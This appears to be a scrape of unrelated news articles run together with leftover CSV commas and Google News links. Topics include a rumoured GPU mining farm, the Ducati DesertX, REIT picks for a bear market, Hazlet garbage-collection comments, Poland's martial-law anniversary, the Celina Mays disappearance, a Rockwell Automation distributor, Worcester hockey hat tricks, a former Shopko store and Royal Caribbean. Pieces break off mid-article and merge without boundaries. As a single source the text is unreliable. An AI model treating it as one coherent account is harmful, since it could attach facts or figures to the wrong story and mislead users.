The mining farm combined was able to produce up to 3.91 TH/s mining hash rate in Ethereum and currently averages at 2.47 TH/s. Based on the average hash rate the mining farm is able to output 5 ETH per 3 hours and has a monthly estimated payout of over $4 million US. Each transaction is worth around $20000 US (every 3 hours). The NVIDIA GeForce RTX 4090 Ti & AMD Radeon RX 7000 GPUs are going to be part of the next-gen gaming lineup and are not expected to launch till the end of 2022. The mining farm that has been spotted joined 12 days ago & has already raised the network difficulty to 11PH since.

Now this could all be just a huge-scale mining farm with dedicated ASIC miners or existing graphics cards being given names of next-gen parts to make it stand out from the rest. But then again if this was true which is highly unlikely then NVIDIA and AMD's next-gen lineup is definitely going to be gobbled up by a new wave of miners hungry for the massive crypto-mining potential that these chips pack.",https://news.google.com/articles/CBMilwFodHRwczovL2x1eHVyeWxhdW5jaGVzLmNvbS90cmFuc3BvcnQvdGhlLWFsbC1uZXctZHVjYXRpLWRlc2VydHgtaXMtYS1jYXBhYmxlLW9mZi1yb2FkLW1vdG9yY3ljbGUtaW5zcGlyZWQtYnktdGhlLWNsYXNzaWMtcmFsbHktYmlrZXMtZnJvbS10aGUtMTk4MHMucGhw0gEA?hl=en-US&gl=US&ceid=US%3Aen,The all-new Ducati DesertX is a capable off-road motorcycle inspired by the classic rally bikes from the 1980s,"

It’s raining adventure motorcycles this year. After the launch of the Husqvarna Norden 901 and the next-generation Triumph Tiger 1200 the ADV segment has a brand new competitor that has been purpose-built for adventure seekers. Meet the 2022 Ducati DesertX a middle-weight off-road machine inspired by the iconic rally motorcycles that competed during the golden age of the Paris-Dakar rally. Ducati introduced the Desert via the sixth episode of this year’s World Première series. The Ducati DesertX had debuted in a concept form back in 2019 at EICMA which had received a very positive response from the company’s patrons. Although Ducati’s current line-up has several adventure and off-road-focused motorcycles the DesertX appears to be more capable than all of them.





Starting with the design as mentioned before the DesertX gets retro-inspired styling which is free of any kind of clutter and fuss. All the styling elements are clean and easy on the eye. The highlight of the adventure bike’s styling is its twin-headlight design which has been directly inspired by adventure bikes from the 1980s and early ‘90s. Unlike modern ADV motorcycles the DesertX’s windscreen isn’t complex either. However the retro design of the bodywork hides underneath it a thoroughly modern motorcycle with the latest hardware and features.



The Ducati DesertX gets an all-new steel trellis chassis and comes fitted with 21-inch front and 18-inch rear wire-spoked wheels that are wrapped in OE-fitted Pirelli Scorpion Rally STR rubber. Ducati claims that the DesertX has a dry weight of 445 pounds making it 50 pounds lighter than the Multistrada 1260 Enduro. The motorcycle has a 5.5-gallon fuel tank but buyers can an auxiliary 2.1-gallon fuel tank as an optional extra. The DesertX is powered by the familiar 937cc Testastretta V-twin which is also found in the Multistrada V2 and Monster models. The engine makes 110 horsepower and 68 pound-feet of torque which is more than enough for machines built to take on off-road conditions. In the US the all-new DesertX will go on sale in June of 2022 and will be priced at $16795."

Assuming a market correction or even a market crash could be in the near future is not crazy thinking. The last 11 years from 2009 to early 2020 marked the longest bull market in stock market history. The market correction that came with the onset of the global pandemic in early 2020 for some signaled the end of our great ""bull run."" But given how quickly the markets recovered and have well surpassed pre-pandemic highs it seems to many that we're right back in the midst of an unstoppable bull market. Others have reason to believe in the potential for another correction.

But even if they come bull markets don't last forever. Inevitably the stock market will fall and take on the much-dreaded bear market moniker. Many of the stocks that shot up over the past decade will see some level of price correction.

Savvy investors know that bear markets are an incredible time to double down on select stocks and real estate investment trusts (REITs) because they are trading at a discount. While there are countless high-quality REITs to choose from here are three that really stand out as great buys during the next bear market.

1. American Tower

When it comes to real estate it's important to choose operators in industries that are not only backed by high demand today but will be well into the future. Growing reliance on technology data and cloud storage isn't going to change anytime soon. Providers like American Tower (AMT -1.01%) one of the largest cell tower REITs in the world and the largest REIT by market cap are a big part of what keeps our world connected. The company has a global presence operating and leasing around 219000 communication sites in Africa Latin America North America and Europe.

Despite its already massive footprint it's still expanding rapidly having acquired two data centers and 4369 new communication sites primarily in international locations in the third quarter alone while continuing its rollout of 5G technology. That 5G deployment accelerated the company's metrics in the third quarter with revenue increasing 21.9% year over year adjusted funds from operations (AFFO) growing by 13.3% and net income up 56.9%.

The company recently announced the acquisition of data center REIT CoreSite Realty (COR) for $10 billion a deal set to close by the end of the year. This move will help solidify American Tower's position as a premier provider in our data-driven world.

There's are clear continued growth opportunities here but American Tower's expensive share price makes it a hard sell in today's market. A bear market should offer a great opportunity to stock up on this top-performing REIT.

2. Prologis

Prologis (PLD -0.61%) is the largest industrial REIT operator in the world today. It is next in line behind American Tower when it comes to market cap and another behemoth company that dominates the industry it operates in. And given that industrial real estate is experiencing incredible growth and unparalleled demand it's a great industry to be in.

Prologis owns and leases roughly 4675 industrial properties which equate to nearly 1 billion square feet under management across some of the world's top markets. Voracious demand for warehouse and logistics space has pushed the company's rental rates and revenue to record highs over the past year with space being effectively sold out within its operating markets.

Effective rent rates rose 27.9% year over year in the third quarter of 2021 with a mere 3.4% vacancy rate. Historically Prologis has performed incredibly well providing investors with a 22.08% annualized return over the past 10 years and seven straight years of dividend growth.

All that being said the company is also trading at a premium meaning a bear market might present a better opportunity to grab shares in this reliable company at a reasonable price.

3. Realty Income

Retail is one of those sectors that investors either love or avoid. Considering the rise in e-commerce the future of retail has become somewhat unstable. And while retail may not look the same in 20 years as it does today it won't go away altogether. This fact makes Realty Income (O 0.70%) one of the largest and most dependable retail REITs in the market today a great buy in the event of a bear market.

Realty Income started and continues to primarily operate in the retail sector with roughly 83.7% of its portfolio being single retail properties shopping centers and malls. Over the past year however the company has dramatically expanded its portfolio into international locations and merged with VEREIT which adds to its office exposure. As of Q3 2021 Realty Income has interest or ownership in 7018 commercial properties including industrial office agriculture and retail.

The company has instituted 112 dividend increases since going public in 1994 and it maintained a 15.23% annualized return since IPO with 24 out of 25 positive years of growth. It definitely prides itself on being a dependable trustworthy REIT which has led share prices to become quite costly in recent years. A bear market would be a prime opportunity to snag this company at discounted prices while being backed by one of the highest-quality portfolios in the REIT industry today.

Compelling bear market buys

Bear markets shouldn't be feared -- they are what allow for money to be made so swiftly in the bull market that inevitably follows. Knowing what to purchase and when is key. REITs in particular can be great buys in down markets because they often pay competitive dividends while providing exposure to a diverse range of high-quality real estate assets. And these three REITs should be great buys during the next bear market.",,,,,,,,,,,,

___

Yes definitely - I am up for saving some money and I think it would be more efficient if everyone had the same garbage company.

___

Yes I would love to have one garbage company servicing all of Hazlet. Especially if it offers Bulk pickup regularly in the cost.

_____

Yes. I live on a Cul-de-sac with 7 houses and we have 3 different companies wearing down our road.

_____

Absolutely. The constant price increases missed pick ups extra cost for bulk items etc. are a nuisance. Most other municipalities have this negotiated and rolled up in their taxes.

_____

Yes! It would be much appreciated and would reduce the building traffic in town. Also the bulk pick up is a high saver; in the past we’ve paid $150 for bulk pick up of general household items (no large furniture or anything oversized). Municipal garbage collection will help keep our home and yards free from clutter.

_____

Absolutely. Bid to the market. Set the hours appropriate for collection that is safe.

_____

Yes. Hoping that a town-wide garbage collection would lower each homeowner’s cost for garbage removal. As long as the quarterly price is lower than what we are currently paying.

_____

Absolutely. It’s long overdue to offer municipal garbage collection with monthly bulk pick up. It’s a pain having three different garbage companies come through the development almost every day of the week. The time of day doesn’t bother me since I’m up by 5:30 even on weekends; however these local roads were not meant for so many loud and heavy trucks. Having just bought my parent’s home I was so surprised with how the garbage companies are constantly changing their rates and having to shop around every once in awhile is a hassle especially as a new homeowner.

_____

Yes. Let's get a set price that is affordable for all. My rates have gone up almost every bill. It may not be a lot but they nickel and dime you until they force you to find a cheaper service. I would like bulk pickup once a month. That would be a great service. It would be nice to have one company instead of 4-5 servicing the town. Please try and make this happen. Thanks.

_____

Would absolutely appreciate a monthly bulk pickup and one municipal company to handle the trash at a reasonable hour. It would also help with notifications during inclement weather that pickup could be delayed.

Yes but only if the pricing is reasonable and isn’t increased 10-20+% year over year.",https://news.google.com/articles/CBMic2h0dHBzOi8vd3d3Lmdvdi5wbC93ZWIvbGlieWEvbGlnaHQtdXAtdGhlLWxpZ2h0LW9mLWZyZWVkb20tb24tdGhlLTQwdGgtYW5uaXZlcnNhcnktb2YtdGhlLWltcG9zaXRpb24tb2YtbWFydGlhbC1sYXfSAQA?hl=en-US&gl=US&ceid=US%3Aen,"""Light up the Light of Freedom"" on the 40th anniversary of the imposition of martial law - Poland in Libya","In connection with this year’s 40th anniversary of the declaration of Martial Law the Institute of National Remembrance invites you for the ninth time to participate in the social campaign ""In Tribute To Victims of Martial Law. Light the Light of Freedom ” by placing a lit candle in the window on December 13 and expressing solidarity with the victims of Martial Law. You can also light a virtual candle at: www.swiatlowolnosci.ipn.gov.pl.

The campaign refers to the gesture of solidarity that masses of the inhabitants of the free world made towards Poles living under Martial Law on Christmas Eve 1981. US President Ronald Reagan and Pope John Paul II called for symbolic lights to be placed in the windows.

In his Christmas address the US President mentioned Poles suffering under the communist regime and addressed the Americans saying: ""Let the light of millions of candles in American homes be of notice that the light of freedom cannot be extinguished."" That winter candles were lit in the window of the White House and in the Apostolic Palace in the Vatican. Poles similarly expressed their opposition to the brutal policy of the communist authorities.

This year's campaign is held under the National Patronage of the President of the Republic of Poland Andrzej Duda on the Centenary of Regaining Independence. We invite you to read his message below.

The 40th anniversary of the imposition of martial law is approaching. Back then the communist regime declared war on the Polish people. Thousands of ""Solidarity"" activists were imprisoned those who fought for freedom were removed from their work and universities and brutally beaten as the regime attempted to quench the protests. Some of them even lost their lives.

We remember all the victims we remember those repressed under martial law. We remember the Heroes! Their courage and strength eventually brought down communism and Poland regained its freedom. They take credit for the fact that today we live in our own sovereign democratic state.

As a sign of this remembrance on December 13 let us light up the Light of Freedom in the windows of our homes. Let its flame remind us of the victims. Let it remind us of the victorious struggle against enslavement and of regaining a free Poland.

Whether he's out and about or just watching something at home whenever he sees a picture of Barney the titular character from the popular children's show he can't help but smile.

""She used to like to sing the Barney song changing the words to be humorous"" Benaglio 54 said ""because she thought Barney was stupid. So every time I see Barney that's what I think of.""

Wednesday marks the 25th anniversary of the last time anyone's seen his sister Celina Mays. Her disappearance from her Willingboro home has at times gathered national attention and been the subject of conspiracies and accusations thrown between both sides of her family.

Celina was 12 years old when she disappeared. She was also nine months pregnant just two weeks from her due date. After following hundreds of leads that have yet to bear any meaningful fruit police are mobilizing efforts to get people talking about her again.

Celina Mays' last night at home: Ice cream and thanks

""In 1996 we had limited resources to communicate with the public and acquire details regarding missing persons"" the Willingboro Police Department said in a statement. ""In 2021 social media has evolved greatly and can now reach a wide variety of people quickly through many platforms. We are using social media to distribute information about Celina to raise awareness of her case. We are hopeful that social media will be a beneficial tool in finding new information about the disappearance of Celina Mays.""

The department has been working with the National Center for Missing and Exploited Children (NCMEC) since 1996 to her find Celina who would now be 37. Recently the organization has requested media circulation from Walmart USA Today Surfer Quest and FIA in multiple states.

Over the years the case has been passed on to a handful of officers as a result of retirements. Still Willingboro Detective Monica Pogorzelski said enthusiasm toward solving it hasn't wavered.

""This isn't something that just got pushed to the side"" she said. ""It's been continually investigated and whatever leads come up we follow and go go go; and just nothing turns up of any evidentiary purposes to go farther.""

Celina disappeared Dec. 16 1996.

After church that night the family returned to their Crestview Drive home and ate ice cream in the kitchen. When Celina finished around 11 p.m. she kissed everyone good night and put her dishes in the sink.

All was as normal until according to her stepmother Evette Mays Celina said ""thanks for everything."" The family may not have thought anything of it in the moment but looking back they saw it as her telling them goodbye.

Celina's 4-year-old stepsister was sent to wake the teen for breakfast but she found only pillows and sheets arranged to make it seem like she was still in bed. All of Celina's personal belongings like her purse and CD player were left in the room. It appeared as though she left with nothing but the clothes on her back.

Disappearance conspiracy theories

It didn't take long after her disappearance was reported for the speculation and theories to form.

One of the first angles police looked at was identifying the father of Celina's child. Family members claimed she never revealed who got her pregnant. In fact her father C.J. Mays said she became upset when she learned blood tests done on the baby could lead to the identification of the baby's father. Mays said his daughter told him the father was 16 and not a member of their church.

In an effort to prevent certain rumors from spreading out of control Mays submitted to the police that he had gotten a vasectomy years before. His doctor confirmed this.

Despite Celina's age the family objected to an abortion because of their faith. Amplifying the urgency to find her was the fact that due to her being so young she likely wouldn't have been able to perform a vaginal birth and would have needed a caesarean section.

Both sides of Celina's family have pointed the finger at the other in search of her whereabouts. But that tension existed well before the disappearance.

Celina was born May 21 1984 to C.J. Mays and Lynn Vitale. The three moved from Miami to Palmyra in 1986. When Vitale died in 1994 from an aneurysm her maternal family attempted to gain custody of Celina citing Mays' criminal history involving domestic abuse and drug use. He said he moved past that life after leaving Florida and finding religion in New Jersey. Mays was ultimately given custody and Celina moved in with him in Willingboro.

At the time of the disappearance Cindy Cram Celina's maternal aunt suggested that Mays' family was hiding her and suspected foul play. His family on the other hand placed blame on the mother's side of the family alleging they took her either back to Florida or to Michigan where they're originally from because they still wanted custody of her. Mays also believed the family didn't like him because he's Black and they're white.

Although she would love to see her niece again Cram isn't optimistic.

""My feeling about it right away was she's not alive"" Cram said. ""Sometimes you go with your gut feeling. And I still don't feel that she was alive. I think they shut her up.""

Cram points to concerns and controversies surrounding the Mays' church Gospel of Christ Ministry which fell under scrutiny early in the investigation.

In 1991 Gospel of Christ was removed as a member church of Christ Gospel Ministries International of Jeffersonville Indiana a Pentecostal denomination of more than 1100 members. This removal came after an investigation into claims that its pastor Cerita Smith C.J. Mays's sister ran the church with an ""authoritarian style.""

Barbara Young an attorney for the organization said at the time they found Smith's ""philosophy of church leadership and her management of financial matters to be incompatible with our philosophy and policies.""

Gospel of Christ Ministry was the focal point of the Mays family. Many of the adults worked there; the children were homeschooled there; and it dominated their social lives. During the initial investigation into Celina's disappearance multiple members of the church spoke out and claimed that Smith controlled every aspect of the church and family.

Smith and Mays' family provided little cooperation for the investigation police said at the time.

C.J. Mays died in 2019. Other members of the Mays family could not be reached for comment.

Today the church property on Washington Street in Mount Holly appears abandoned. Residents there say the building hasn't been a house of worship in more than a decade.

One resident who only gave the name Tina said she remembers when the entire town could only talk about Celina and the church.

""The kids would play and I'd be like 'Don't go down that way'"" Tina said while motioning toward the former church a few hundred feet away. ""There was a lot of talk about the girl that went missing.""

Initially Smith claimed allegations and suspicions were drummed up by former members who simply wanted to see the building fail. After speaking during the early phases of the investigation Smith has rarely given statements to the media or police and denied police requests to search the home and church.

Officers were denied a warrant to search the Mays' home with a judge ruling they could be considered victims citing Mays' claims police demonstrated bias against the family during questioning.

One of the most promising leads came on Jan. 25 1997 when the owner of a Sizzler's location in Howell told police he saw Celina dining with a group. The girl who came in with a pastor and several other people including a photographer didn't appear to be pregnant the restaurant owner Narain Harpaul told officials.

Police followed up on the tip but ultimately determined the girl was not Celina.

Police puzzled but still working the case

The first weeks of the investigation turned into months and then years and now more than two decades. But the case isn't bearing much fruit.

Two years ago the Mays's moved out of their Crestview Drive home according to a woman who lives across the street from the property. She didn't know the family or the case very well but simply knew them as well as anyone would know their average neighbor. It's not known where they reside now.

Police today are still as puzzled as they were the day she was reported missing; but continually-evolving technology may change that. Today if she's alive and if she successfully gave birth Celina's a 37-year-old mother with a 25-year-old child. An age-progressed headshot has been developed and distributed across the country and police are hoping someone will recognize her.

Maybe someone will pass one of those flyers and wonder why their friend's mother is reported missing; or maybe someone else will recognize her as a co-worker not realizing they work the same shifts with someone who's the subject of one of the most high-profile cold cases in state history; or maybe the rumors were true and the 12-year-old known for being wise beyond her years had her life tragically cut short after she vanished without a trace.

Industrial automation and digital transformation firm Rockwell Automation has appointed PowerPro as its authorised distributor in Nigeria.

Rockwell Automation has been supplying its well-known Allen Bradley brand of products to the Nigerian market for more than a quarter of a century and already has a large installed base in the country reports Craig McMaster Channel Sales Manager for Rockwell Automation Africa.

The partnership is expected to grow this base.

According to Rockwell Automation PowerPro has a stellar record in terms of on-time delivery and end-user support by leveraging local inventory technical and human capabilities.

“Given PowerPro’s existing end-user relationships in diverse sectors we are expecting aggressive expansion of the already significant Rockwell Automation footprint in Nigeria” says McMaster.

The companies adds that Nigeria Africa’s largest economy with an estimated population of 200 million people offers significant growth potential in a number of sectors including food and beverage chemical oil and gas cement household and personal care marine power generation and the fast-growing mining sector.

They says that whilst the Nigerian economy suffered as a result of COVID-19 the African Development Bank (AfDB) expects it to grow by 1.5% in 2021 and 2.9% in 2022 based on an expected recovery in crude oil prices and production.

It showed strong growth in the second quarter of 2021 growing 5% year-on-year driven primarily by the trade information and communication transportation electricity agriculture and manufacturing sector.

While the private sector Purchasing Managers Index (PMI) rose to an 18-month high in July suggesting that business activity firmed at the outset of quarter three.

Adebayo Johnson General Manager for PowerPro.

Adebayo Johnson General Manager for PowerPro says “Many production companies struggle to keep pace with the demands of the Nigerian market as a result of the unplanned shutdowns due to the unavailability of parts and production inefficiencies. Our partnership with Rockwell Automation is a strategic decision geared towards meeting the smart manufacturing needs of the Nigerian market by providing Rockwell Automation hardware software and lifecycle services required for digital transformation.”

PowerPro already holds inventory of commonly requested Rockwell Automation hardware in Nigeria including the range of Allen-Bradley industrial control and automation equipment. Going forward the two companies expect to see a growing demand for industrial control equipment either as products to be built into MCC’s or in the form of low-voltage motor control centres.

McMaster says customers can get access to local and current product inventory including spares and replacements and receive technical assistance from local distributor product specialists who have benefited from factory training.

Post-sale support including a manufacturer’s warranty he adds are other important benefits provided by the local Rockwell Automation authorised distributor. “Rockwell Automation’s warranties are limited to products that have been purchased directly from Rockwell Automation or one of our authorised distributors.”

Meanwhile McMaster reveals: “We’re also expecting to see a bigger need for solutions in manufacturing execution systems and information software an area where Rockwell Automation is strongly focused.”

Plans are in place for PowerPro to commission the first Rockwell Automation Customer Experience Centre to serve as a connection point for Rockwell Automation product users in Nigeria.",,,,,,,,,,,,

Correspondent

WORCESTER — Which sports animal will become extinct first baseball’s complete game or hockey’s hat trick?

As sport evolves from art to science it loses some of its humanity which is not necessarily good or bad. It is just reality. In hockey there is nothing more human than a hat trick and an ice sheet covered with headwear.

When Railers forward Ross Olsson registered a hat trick at Adirondack late last month it was a little unusual. Even more unusual — Olsson also had a Gordie Howe hat trick — a goal an assist and a fighting major in the same game.

Worcester’s ultra-hockey fans Darryl Hunt and Rich Lundin asked if any of the city’s 622 pro players had ever done that before and when either or both ask a question it deserves an answer.

That answer is no.

It took 1801 games to happen but Olsson is the first Worcester pro with a double hat trick — the regular and the Gordie Howe.

The definition of a hat trick has broadened through the years. It originally was very unique and very difficult to achieve — a player scoring three consecutive goals in the same period. The Gordie Howe hat trick is essentially misnamed. He played 2186 games in the NHL and WHA combined and only had two Howe hats.

That was mainly because Howe was such a good fighter nobody wanted to take him on.

The number of hat tricks has shrunk steadily since the IceCats brought pro hockey here in 1994-95. They had 37 in 11 years the Sharks had 12 in nine years and the Railers have had four in four years. Hat tricks are odd statistical creatures though. While the Railers have had just four in the regular season they have the only one in a Worcester playoff game — there have been 99 such games all told — Nick Saracino at Adirondack on April 21 2018.

And Olsson’s is the only one as part of a Gordie Howe.

History behind hat tricks in Worcester

The first Worcester hat trick was Martin Mercier of the IceCats on Oct. 29 1994 in a 5-5 tie at Hershey. The first one on home ice was the next night by David Haas in a 4-3 loss to Rochester. They were also the first in back-to-back games.

Fred Knipscheer has the most registering four in 1995-96. That’s a Worcester single-season and all-time record. Nobody else has more than two for a year or career.

There have been four “natural” hat tricks the old-fashioned kind where a player scores three in a row in the same period. John Carter did it on Jan. 4 1995 at the then-Centrum versus Cape Breton as part of his five-goal game the only one in Worcester history.

Bob LaChance had one in 1997 then the Sharks had two in 2014-15 both against Portland. Freddie Hamilton did it in Worcester on Oct 26 2014 and Jeremy Langlois did it in Portland on Jan. 21 2015. Langlois’ was memorable. The Sharks were behind 2-0 going into the third period and Langlois scored at 7:06 12:07 and 18:10 to give Worcester the victory.

Olsson is part of a record — most hat tricks by a town. He is from Billerica and so is Dennis McCauley who posted an unlikely hat trick for the Sharks in Springfield on Feb. 3 2010. McCauley was known more for his penalty minutes than goals and was in the lineup that night because Logan Couture was unavailable.

McCauley’s surprise feat was similar to Kevin Sawyer’s at the DCU Center on Dec. 30 1998. For the season Sawyer had eight goals and 299 penalty minutes. In that game a 4-2 IceCats victory over Springfield Sawyer had three goals and no PIM.

No Worcester player posted a hat trick in his debut but Chris Kenady had one on Feb. 28 1996 in the first game he ever scored a goal. While Carter is the only player with five goals Michal Handzus had four on Jan. 9 1998 in Providence as the IceCats beat the Bruins 6-5. His fourth won the game in OT.

Jeff Panzer had a hat trick in the IceCats' memorable 7-6 overtime victory against Manchester on March 30 2003 and his third goal was the OT winner.

Some other hat trick oddities:

• Worcester teams are 49-2-2 when someone has a hat trick.

• No Worcester defenseman has ever recorded one although Terry Virtue had one for the IceCats on Dec. 7 1996 while playing right wing.

• Marty Reasoner had a hat trick in Syracuse on Dec. 11 1999 in a 6-5 triumph one of the goals coming on a penalty shot. Derek Bekar has the only Opening Night hat trick in a 4-0 victory at Lowell on Oct. 6 2000.

• Nic Pierog is the only player to register a hat trick both for and against Worcester. He had one for the Railers in a 5-2 victory at Reading on Jan. 4 2020 and also scored four goals at the DCU Center on March 19 2019 in a 7-4 Manchester victory.

• Westboro’s Jim Campbell had a 3-3-6 night in the IceCats’ 9-4 victory over Saint John at the DCU Center on Dec. 28 1999. The Flames’ starting goalie was so bad he was replaced by an emergency backup Rick Poirier a fireman from New Brunswick. Campbell scored on Poirier who after the game talked about what a thrill it was to give up a goal to a former NHL sharpshooter.

Oh and there is a Westboro guy on this year’s Railers Jordan Smotherman so maybe that town has a chance to tie Billerica’s record. It would even better if Smotherman did it at the DCU Center.

Think of all those hats on the ice.

The Shopko store closed in West Bend April 15 2019 as the national retailer based in Green Bay WI filed bankruptcy.

Since then the location 1710 S. Main Street in West Bend has been for sale. It has randomly been leased by the seasonal Halloween store but generally it sits empty.

In neighboring Fond du Lac County a similar scenario took place with the Shopko 616 W. Johnson Street. That location closed in 2019 and sat empty until April 2020 when the parcel sold to Corta Development of Florida.

Corta Development describes itself as “Commercial Retail development and redevelopment firm serving national tenants and brands.”

Corta Development is now leasing the former Shopko space on Johnson Street to a pair of big box retailers.

Jim Cleveland Vice President of Economic Development with Envision Greater Fond du Lac said he started working with Corta Development a couple years ago.

“Corta Development has been a great partner to work with” said Cleveland. “Their development to purchase and repurpose the old Shopko building has really been important because it’s taken one of these vacant big box stores which are extremely hard to repurpose and it brought in more retail options for our community.”

Aside from splitting the Shopko space with new tenants Big Lots and Hobby Lobby a new Taco John’s restaurant is being constructed in the out lot on W. Johnson Street.

“For Fond du Lac and the City of Fond du Lac it’s another piece to a development barrage that’s been going on in the West Johnson Street corridor” said Cleveland. “When you look at the Forest Mall redevelopment and look at some of the new restaurants moving in it’s really been a big big plus for our community.”

As far as the breakdown of the former Shopko in Fond du Lac the size of the building according to Cleveland is about 86000 square feet. Big Lots will take up a small section on the east endcap while Hobby Lobby will occupy a significantly larger space.

“Yes there’s a lot of online shopping but at the end of the day having options for citizens to go to locally still has a lot of relevance” Cleveland said. “There is a significant amount of people that still like going to physical store locations. The community is extremely excited about both Big Lots and Hobby Lobby coming to town.”

Questioned whether any other big box stores were in the mix with the former Shopko building in Fond du Lac Cleveland said he “could not speak to that.”

“From conversations I have had with other development firms other commercial brokers there’s a lot of retail restaurants looking at not only Fond du Lac but I would suspect this whole area from Washington County up through Winnebago County” he said. “There’s just been a lot of activity with retailers and restaurants looking at this area of the state of Wisconsin right now.”

Calls to corporate Big Lots have only been answered via a message saying “Judith our information shows that the only store opening in Wisconsin in the near future is at Fond Du Lac on December 30 2021.”

Side notes:

Cleveland confirmed Corta Development purchased the former Shopko building in Fond du Lac. It is leasing the space to Big Lots and Hobby Lobby.

the space to Big Lots and Hobby Lobby. In West Bend investors purchasing large retail outlets is nothing new. In July 2021 WashingtonCountyInsider.com reported on the sale of the former Boston Store building and the strip mall to the north sold to City Pointe LLC of Brookfield for $3.6 million. So far there’s been no updates on any new tenants.

and the strip mall to the north sold to City Pointe LLC of Brookfield for $3.6 million. So far there’s been no updates on any new tenants. There was “no comment” from Hobby Lobby in West Bend regarding what it may know about the former Shopko location next door.

Calls have also been place to Economic Development Washington County however it normally refrains from commenting and deals more with industry and manufacturing. Several aldermen questioned about the potential sale /development had no insight.

Bad Neighbour Records started in 2019.

Ross said: ""I'm a hip hop fan and vinyl is essential for that.

""We needed a record shop and it seemed like a good time.

""Word was getting around the vinyl fanatics and I was building up a base of loyal customers.

""But we needed to be a bit closer to town and we wanted to expand this partnership has helped us speed things up.

""Combining it with the food and drink is fantastic.

""We've got most music genres covered now.""

""We’ll also be opening a Vinyl Record Cafe Bar beneath the Stockton venue - serving cocktails and coffee.""

Bad Neighbour Records opens from noon until 9pm Tuesday to Saturday and 12-7pm Sundays."

The program was first introduced on March 6 2020 and gives guests far more flexibility to cancel cruises after the final payment due a helpful tool considering the rising number of COVID-19 cases worldwide.

Royal Caribbean Extends Cruise with Confidence Program

Royal Caribbean wants to offer the same worry-free experience to guests as they have done for many months during the pandemic. The program was due to expire on December 17 2021 and applied only to cruises through April 2022.

The new extension is valid for all reservations confirmed on or before January 31 2022 for cruises that sail through May 31 2022.

“With the holiday season upon us our thoughts turn gratefully to those who have stood by us. As we make strides towards our fleetwide return we want to ensure that planning your clients’ vacations is as worry-free as possible. Therefore we’ve made the decision to extend our popular Cruise with Confidence program to reservations confirmed on or before January 31 2022 and sailing through May 31 2022.”

Although the program does not allow a full cash-back refund it does provide guests the opportunity to rebook the voyage through the use of a Future Cruise Credit.

How Does Cruise with Confidence Work?

The Cruise with Confidence program from Royal Caribbean is precisely what the name suggests. It provides guests with the reassurance necessary to confidently book a cruise during these uncertain times and provides guests with different options and additional flexibility when booking a Royal Caribbean cruise. Should guests change their minds before their voyage they are eligible for the program.

Guests who opt-in to the program then have up to 48 hours before the sail date to cancel their cruise; they will receive a Future Cruise Credit equal to 100% of the cruise fare paid to Royal Caribbean.

However should guests decide not to opt-in they will be bound to the original cancellation policy which could turn out quite bad for the guests. In most cases this means guests will not receive any refund if they cancel 30 days before the voyage or later.

Boosting Consumer Confidence

Royal Caribbean has several policies in place to boost confidence for guests. One of such is the COVID-19 Assistance program. This allows vaccinated guests and children who are not yet eligible for vaccination to cancel their voyage up to 14 days before sailing and receive a full 100% refund of the cruise fare for the travel party should they test positive.

It also includes guests who test positive while onboard which would make them eligible for a pro-rated refund. The COVID-19 assistance program is in place through April 2022.

Royal Caribbean is hard at work to operate its entire fleet by the spring of 2022. To achieve this it will need to bolster confidence from guests. While the safety onboard has been well documented the Cruise with Confidence and COVID-19 assistance programs will help grow confidence and fill up the ships.",https://news.google.com/articles/CBMiY2h0dHBzOi8vd3d3LnJveWFsY2FyaWJiZWFuYmxvZy5jb20vMjAyMS8xMi8xMS90aGUtd2VpcmRlc3QtZm9vZHMteW91LWNhbi1lYXQtcm95YWwtY2FyaWJiZWFuLWNydWlzZdIBAA?hl=en-US&gl=US&ceid=US%3Aen,The weirdest foods you can eat on a Royal Caribbean cruise,"Royal Caribbean serves its guests thousands of meals and snacks across every ship on a daily basis including a few items that may make you raise an eyebrow when you see it.



Liquid mushroom truffle risotto

Because Royal Caribbean serves an international clientele there are going to be things on the menu that are not what you are used to. Expanding your palate is one thing that makes going on a cruise fun but every so often there is a dish that is so different you can't help but think ""that is weird.""

I try to be as open minded as possible when I go to any restaurant but I've run across a few foods on Royal Caribbean that are just too much out of my comfort zone to give a try. I'm certain there are plenty of people who love these foods but it seems like those foods are at best an acquired taste.

Whether you want to be an adventurous eater or just want to gawk at what else there is here is my list of five weird foods served on Royal Caribbean cruise ships.

Truffle & Eggs pizza

I love the new menu at Giovanni's Italian Kitchen but the Truffle & Eggs pizza is something I thought about a lot and could never get myself to try.

This pizza has a fried egg on it which evidently is a very common thing in Europe.

Linken D'Souza Royal Caribbean's Global Vice President Culinary Dining & Beverage told me when Giovanni's launched about the decision to include a fried egg on pizza ""We've gone back to recipes traditionally seen in Europe. So for example it's very rare for you to see a fried egg on a pizza.""

""That's actually very common in Europe. There's actually restaurants and every pizza they serve will do a fried egg on it.""

I know they say ""When in Rome do as the Romans do"" but I think I'll stick to one of the other eight other amazing pizza options on the new Giovanni's menu.

Tomato water

This article could have been almost entirely made up of foods from Wonderland specialty restaurant but I decided to pick just one that stood out as the weirdest which is the tomato water appetizer.

Let me start off by saying I love tomatoes but the tomato water serving is just strange in its taste serving and texture.

Essentially each guest is given a test tube of the tomato water to drink as a shot. Tip your head back close your eyes and look out stomach because here it comes.

Besides the presentation being odd not even an ardent tomato lover like myself really wants nothing but straight tomato essence.

Escargot

While a staple of Royal Caribbean's main dining room menu the first time anyone sees escargot on the menu is almost certain to evoke an ""eww"" after hearing what it is.

Escargot is baked snails and it is indeed a delicacy.

The menu describes the escargots bourguignonne as ""tender snails drenched in melted garlic-herb butter.""

This is one weird dish that I've grown to enjoy mostly because it's more garlic and butter than anything else. But I also try not to think too much about what I'm about to eat when I eat it.

Beetroot & Dill gravlax

Something I only saw for the first time a month ago was variations of gravlax in the Windjammer on Odyssey of the Seas.

Gravlax or graved salmon is a Nordic dish consisting of salmon that is cured using a mix of salt and sugar and either dill or sprucetwigs placed on top and may occasionally be cold-smoked afterwards.

While I've seen plenty of smoked salmon in my day the beetroot and dill gravlax made me stop and stare.

Nick Vitani posted photos in the Royal Caribbean Dining Facebook group of the gravlax that was served on Navigator of the Seas and it elicited quite a few comments.

British foods (if you're not from Britain)

We have many readers here from the United Kingdom and while I appreciate all of your support there are some weird British food in the Windjammer I have always shaken my head at as I walk by for years.

Royal Caribbean will offer traditional British foods in the Windjammer such as bangers and mash or Yorkshire pudding. You see these foods on European itineraries but they also show up on North American sailings as well.

I am the first to admit it's only weird because I'm not British (and even as an American grits are equally weird) but I have yet to find the motivation to try ""English Bacon"" or ""English Bangers"".",,,,,,,,,

He had reached the dying embers of Paris St.-Germain’s run in the Champions League. Yet again the dream of European glory that powered the club for more than a decade had been dashed.

